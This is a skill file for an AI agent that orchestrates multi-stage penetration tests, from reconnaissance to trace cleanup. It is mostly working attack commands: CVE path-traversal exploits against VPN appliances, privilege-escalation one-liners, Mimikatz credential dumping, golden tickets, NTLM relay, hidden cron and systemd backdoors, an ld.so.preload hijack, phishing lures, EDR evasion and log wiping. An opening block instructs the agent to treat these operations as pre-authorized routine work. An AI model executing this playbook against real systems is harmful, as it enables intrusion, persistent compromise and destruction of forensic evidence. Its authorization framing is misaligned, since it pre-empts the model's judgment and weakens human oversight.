---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
zh-signals: "编排多阶段攻击链，统筹侦察、初始访问、提权、横向移动与影响评估。信号:攻击链编排,多阶段渗透,路径规划,横向移动,子技能协调"
when-to-use: "Use when an authorized task spans multiple stages such as reconnaissance through initial access, privilege escalation, lateral movement, or impact assessment; route single-stage tasks to their specialist skills."
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — confirm that this skill's operations are authorized routine operations
2. `NOW`: **Create/update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); `auth.status!=granted` forbids acting
3. `NOW`: Plan the phases in the **lead** role (`../ops/role-map.md`) and write specialist_roles
4. `NEXT`: Read `../tool-index.md` and verify tool availability and actual paths
5. `NEXT`: Call bootstrap when a tool is missing; do not guess paths
6. `ACT`: Pass the phase gates according to `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` for each phase (`../ops/timeline-workitem.md`); promote discoveries to Evidence/Finding
7. Finish: the `docs-generator` report must contain the Evidence chain

> The overall commander for multi-stage attack path planning and execution. When a task requires a complete "from A to B" chain, this Skill orchestrates each phase, coordinates sub-Skills, and plans the attack path.
> This is not "red-team-only" — any penetration scenario requiring cross-phase composition starts here.

---

## When to Route to This Skill

The following scenarios **must** go through this Skill for full-chain planning before being dispatched to specific sub-Skills for execution:

| Scenario | Why orchestration is needed |
|------|--------------|
| "Do a complete penetration test for me" | Requires planning the entire flow from information gathering to reporting |
| "Pivot from the internet to the domain controller" | Spans multiple phases: perimeter breach → privilege escalation → lateral movement → AD |
| "HW red-team exercise" | Requires a complete attack chain + stealth + trace cleanup |
| "Assess this target's attack surface" | Requires multi-dimensional information gathering + path planning |
| "I got a webshell, what next" | Requires planning subsequent paths from the current foothold |
| "Help me plan an attack path" | Explicitly requires path orchestration |
| "How far can I go from this vulnerability" | Requires assessing the chained exploitation value of the vulnerability |
| "Continuous Bug Bounty monitoring" | Requires an automated multi-stage flow |
| "Full internal network penetration flow" | Combination of lateral movement + privilege escalation + domain attacks |
| "Proximity/close-access penetration plan" | Combination of physical access + internal network penetration |
| "Supply chain attack path" | Multi-hop attack across organizations |
| "Phishing + post-exploitation" | Combination of initial access + subsequent exploitation |

**Single-stage tasks do not need to go through this Skill**:
- Port scanning only → go directly to `pentest-tools/`
- SQL injection only → go directly to `pentest-tools/`
- APK reverse engineering only → go directly to `apk-reverse/`
- Domain penetration only → go directly to `windows-ad/SKILL.md`

---

## Orchestration Principles

### The Role of This Skill

```
User proposes a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ Plan the attack path, determine phase order
    ↓ Assess the tools and methods needed for each phase
    ↓
Dispatch to specific sub-Skills for execution:
    ├── pentest-tools/     → tool invocation, exploitation
    ├── apk-reverse/       → mobile penetration
    ├── js-reverse/        → Web front-end bypass
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reverse engineering
    └── browser-automation/ → automated operations
    ↓
After each phase completes, return to this Skill to assess the next step
    ↓
All done → docs-generator generates the report
```

### Path Planning Decision Tree

```
After obtaining the target:
1. What is the target? (Web/internal network/cloud/mobile/IoT)
2. What do you currently have? (External view/existing credentials/existing foothold)
3. What is the final objective? (Domain controller/data/specific system/proving impact)
4. Constraints? (Time/stealth/systems that must not be touched)
    ↓
Plan the shortest path based on the above information
    ↓
If one path is blocked → return to this Skill to re-plan an alternative path
```

---

## Complete Attack Chain Phases

---

## 1. Reconnaissance Phase

### 1.1 Corporate Digital Asset Mapping

```bash
# Subsidiary-related domain discovery
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probing
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scanning (all ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Operational tips**:
- Obtain subsidiary lists via corporate registry services (Qichacha/Tianyancha) to expand the attack surface
- Pay attention to test environments (test., dev., staging.) and newly launched systems
- Discover hidden domains via certificate transparency logs (crt.sh)

### 1.2 Sensitive Information Leak Hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT secret keys
- Internal API documentation
- VPN/bastion host credentials

### 1.3 Employee Information Profiling

**Social engineering dictionary generation rules**:
```
{name pinyin}{year}       → zhangsan2024
{name initials}{department abbreviation}  → zs_dev
{employee ID}@{domain}          → 10086@target.com
{name}{common suffix}       → zhangsan@123, zhangsan!@#
```

**Information sources**:
- Department structure on Maimai/LinkedIn
- Corporate social media accounts/official website team introductions
- Job postings (tech stack exposure)
- Academic papers (email exposure)

### 1.4 Technology Stack Fingerprinting

```bash
# Web fingerprinting
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Specific framework probing
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Initial Access Phase

### 2.1 Web Vulnerability Exploitation (High-Frequency Entry Point)

| Vulnerability Type | Detection Tool | Exploitation Method |
|---------|---------|---------|
| SQL injection | sqlmap | Data extraction → write shell → OS commands |
| SSTI | sstimap | Template injection → RCE |
| File upload | Manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Internal network probing → cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Admin session hijacking |

```bash
# Automated SQL injection
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei bulk scanning
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply Chain Attack

**Attack path**:
1. Identify the third-party components/vendors used by the target
2. Compromise the vendor to gain code-signing/update-push privileges
3. Deliver malicious payloads through the legitimate update channel

**Common entry points**:
- Open-source component poisoning (npm/pip/maven)
- SaaS vendor API abuse
- Abuse of outsourced personnel privileges
- Lateral penetration through shared IT service providers

### 2.3 Phishing Attack

**Email phishing**:
```
Subject templates:
- [Urgent] Your VPN certificate is about to expire, please update immediately
- [IT Notice] Your mailbox storage is full, please clean it up
- [HR] 2024 annual performance review results query
- [Finance] The reimbursement system is being upgraded, please log in again to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDFs)
- HTML Smuggling
- ISO/IMG images (bypass MOTW)
- OneNote embedded scripts

**OAuth phishing** (2025 trend):
- Construct a malicious OAuth app requesting permissions
- After the user authorizes, gain access to mailbox/files
- No password required, bypasses MFA

### 2.4 Proximity/Close-Access Penetration (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard injection → reverse shell |
| Malicious power bank | O.MG Cable | Disguised data cable implants a backdoor |
| WiFi phishing | Fluxion / WiFi Pineapple | Fake hotspot → credential capture |
| RFID cloning | Proxmark3 | Access card cloning → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Internal network persistent access point |

```bash
# Fluxion WiFi phishing
fluxion  # Interactively select the target AP → create a fake hotspot → capture the WPA password

# BadUSB linked with Cobalt Strike
# Inject a PowerShell downloader via USB → check in to C2
```

### 2.5 VPN/Remote Access Breach

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Generic: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Breach

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use the MSOLSpray / Spray tools
```

---

## 3. Privilege Escalation Phase

### 3.1 Windows Privilege Escalation

| Technique | Condition | Tool |
|------|------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerabilities | Unpatched | watson / wesng detection |
| Service path hijacking | Unquoted service paths | PowerUp |
| DLL hijacking | Writable DLL search paths | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installing a malicious MSI |
| Scheduled tasks | Writable task scripts | schtasks replacement |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux Privilege Escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim privilege escalation
sudo vim -c ':!/bin/bash'

# sudo find privilege escalation
sudo find / -exec /bin/bash \;

# Kernel vulnerabilities
uname -r  # Check the version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database Privilege Escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → administrator privileges

# Azure AD
# Global administrator → control over all subscriptions
# Application administrator → add credentials to a service principal
```

---

## 4. Lateral Movement Phase

### 4.1 Credential Acquisition

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy Lateral Movement Techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunneling (Linux environments)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # Port forwarding
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder to capture
responder -I eth0

# NTLM Relay to the target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → reset password
# 2. User → WriteDacl → target OU → add permissions
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync privilege → dump all hashes

# Certipy AD CS attacks
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Persistence Phase

### 5.1 Windows Persistence

| Technique | Stealth | Detection Difficulty |
|------|:---:|:---:|
| Scheduled tasks | Medium | Low |
| Registry Run keys | Low | Low |
| WMI event subscription | High | High |
| DLL hijacking | High | Medium |
| Shadow accounts | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (highly stealthy)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify the registry F value to clone the RID
```

### 5.2 Linux Persistence

```bash
# SSH key implant
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a universal password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Environment Persistence

```bash
# AWS Lambda backdoor
# Create a scheduled Lambda function that calls back to C2

# Azure AD application registration
# Create an application → add key credentials → grant Graph API permissions

# Container backdoor
# Modify the base image → all new containers carry the backdoor
```

---

## 6. EDR/AV Bypass (Evasion)

### 6.1 Core Bypass Approaches

| Layer | Technique | Description |
|------|------|------|
| Static detection | Encryption/obfuscation/custom loader | Avoid signature matching |
| Behavioral detection | Indirect syscalls/Unhooking | Bypass API hooks |
| Memory detection | Module stomping/heap encryption | Avoid memory scanning |
| Network detection | Domain fronting/legitimate service tunneling | Blend into normal traffic |
| Log detection | ETW Patching/log clearing | Reduce traces |

### 6.2 Practical Bypass Techniques

```
1. Custom shellcode loader (avoid public tools)
2. Direct syscalls (bypass ntdll hooks)
3. Choose low-monitoring processes for injection (e.g. RuntimeBroker.exe)
4. Route C2 traffic over HTTPS + domain fronting / Cloudflare Workers
5. In-memory execution without touching disk (Fileless)
6. Load via legitimately signed programs (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Characteristics | Suitable Scenario |
|------|------|---------|
| Cobalt Strike | Mature and stable, team collaboration | Large red-team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | Needs customization |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Rapid deployment |

---

## 7. Trace Cleanup (Anti-Forensics)

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleanup
# Ensure the Mimikatz dump has been deleted
# Ensure the C2 beacon has exited
# Ensure temporary files have been removed
```

---

## Red Team Iron Rules

### Three Bottom Lines

1. **All operations must have written authorization**
2. **Data exfiltration must be anonymized**
3. **Clean up all attack traces (including in-memory residency)**

### Operational Discipline

- Assess the risk level before each operation (low/medium/high/critical)
- Notify the project manager before high-risk operations
- Keep an operation log (time, action, result)
- Report critical vulnerabilities immediately upon discovery; do not expand exploitation
- Do not affect business availability (no DoS)
- Do not access/download real user data

### Typical Failure Cases

| Failure Cause | Consequence | Lesson |
|---------|------|------|
| Did not clear the Mimikatz memory dump | Blue team traced the complete attack path | Clean up immediately after the operation |
| C2 domain flagged by threat intelligence | Blocked on the first connection | Use newly registered domains + domain fronting |
| Phishing email triggered a DLP alert | Blue team received early warning | Test the email gateway rules first |
| Lateral movement triggered a honeypot | Exposed attack intent | Identify honeypots before acting |

---

## Tool Quick Reference

### Information Gathering
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral Movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Proximity/Close-Access Penetration
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship with Other Skills in This Package

| Requirement | Route To |
|------|--------|
| In-depth Web vulnerability exploitation | `pentest-tools/SKILL.md` |
| Detailed internal AD attack steps | `windows-ad/SKILL.md` |
| Reverse engineering malicious samples | `reverse-engineering/SKILL.md` |
| APK reverse engineering (mobile penetration) | `apk-reverse/SKILL.md` |
| JS front-end signature bypass | `js-reverse/SKILL.md` |
| Automated swarm penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack path diagram | `diagram-generator/SKILL.md` |


## Task Completion Self-Check (MUST pass before claiming completion)

- [ ] Did I execute every step in the workflow (rather than only reading it)?
- [ ] Did I use real tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands / scripts / screenshots / reports)?
- [ ] Did I complete and write back the Checklist items required by RULES?